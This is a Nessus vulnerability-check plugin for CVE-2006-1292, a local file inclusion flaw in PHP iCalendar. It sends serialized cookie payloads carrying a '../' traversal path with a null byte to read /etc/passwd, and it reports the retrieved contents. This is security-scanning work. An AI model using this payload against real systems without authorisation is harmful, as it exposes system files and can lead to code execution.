#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(21083);
  script_version("$Revision: 1.21 $");

  script_cve_id("CVE-2006-1292");
  script_bugtraq_id(17125);
  script_osvdb_id(24030);
  script_xref(name:"EDB-ID", value:"1585");
  script_xref(name:"EDB-ID", value:"6519");

  script_name(english:"PHP iCalendar Cookie Data Traversal Local File Inclusion");
  script_summary(english:"Tries to read a file using PHP iCalendar");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
local file include flaw." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running PHP iCalendar, a web-based iCal
file viewer / parser written in PHP. 

The version of PHP iCalendar installed on the remote host fails to
sanitize input to cookie data normally used to store language and
template user preferences before using it in a PHP 'include()'
function in 'functions/init.inc.php'.  An unauthenticated attacker can
exploit this issue to view arbitrary files and possibly to execute
arbitrary PHP code on the affected host. 

Successful exploitation of this issue does not necessarily depend on
the setting of PHP's 'magic_quotes_gpc'.  For code execution, it does,
though, require that an attacker be able to write to files on the
remote host, perhaps by injection into the web server's error log. 

Note that there may also be a vulnerability in this version of PHP
iCalendar in which an attacker can gain administrative access to the
application by manipulating cookie values, although Nessus has not
tested for it explicitly." );
 # https://web.archive.org/web/20120402162846/http://retrogod.altervista.org/phpical_221_incl_xpl.html
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?c068b47c");
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/03/16");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/03/15");
 script_cvs_date("$Date: 2017/04/25 14:31:38 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:php_icalendar:php_icalendar");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2017 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

file = "../../../../../../../../../../../../etc/passwd";
file_pat = "root:.*:0:[01]:";

cookies = make_list(
  # nb: if the version is <= 2.21 or magic_quotes is on, this should 
  #     let us read a file.
  raw_string(
    "a:2:{",
      's:15:"cookie_language";s:', string(strlen(file)+1), ':"', file, 0x00, '";',
      's:12:"cookie_style";s:',    string(strlen(file)+1), ':"', file, 0x00, '";',
    "};"
  ),
  # nb: if magic_quotes is off, this should give us an error message
  #     we can use to detect the problem in newer versions.
  raw_string(
    "a:2:{",
      's:15:"cookie_language";s:', string(strlen(file)), ':"', file, '";',
      's:12:"cookie_style";s:',    string(strlen(file)), ':"', file, '";',
    "};"
  )
);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/icalendar", "/phpicalendar", "/calendar", "/ical", "/cal", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  clear_cookiejar();
  # Get the cookie name.
  #
  # nb: default to using "phpicalendar", which works for 2.2.1.
  cookie_name = "phpicalendar";

  r = http_send_recv3(method: "GET", 
    item:string(dir, "/preferences.php?action=setcookie"), 
    port:port
  );
  if (isnull(r)) exit(0);

  cookie_l = get_http_cookies_names(value_regex: "a%3[aA]");

  # Try to exploit the vulnerability.
  foreach cookie (cookies)
  {
    foreach cookie_name (cookie_l)
      set_http_cookie(name: cookie_name, value: urlencode(str:cookie));
    rq = http_mk_get_req(item:string(dir, "/day.php"), port:port);
    r = http_send_recv_req(port:port, req: rq);
    if (isnull(r)) exit(0);

    # There's a problem if...
    if (
      # we see the file of interest or...
      egrep(pattern:file_pat, string:r[2]) || 
      # we see an error because magic_quotes_gpc was off.
      string('The requested language "', file, '" is not a supported language.') >< r[2]
    )
    {
      if (report_verbosity && egrep(pattern:file_pat, string:r[2]))
      {
        report = string(
          "\n",
          "Nessus was able to retrieve the contents of '/", str_replace(find:"../", replace:"", string:file), "' on the\n",
          "remote host using the following request :\n",
          "\n",
          "  ", 
	  str_replace(find:'\n', replace:'\n  ', 
	    string: http_mk_buffer_from_req(req: rq))
        );
        if (report_verbosity > 1)
        {
          contents = r[2] - strstr(r[2], "<!DOCTYPE");
          if ("<br " >< contents) contents = r[2] - strstr(r[2], "<br ");

          report = string(
            report,
            "\n",
            "Here are the contents :\n",
            "\n",
            "  ", str_replace(find:'\n', replace:'\n  ', string:contents), "\n"
          );
        }
        security_warning(port:port, extra:report);
      }
      else security_warning(port);
      exit(0);
    }
  }
}
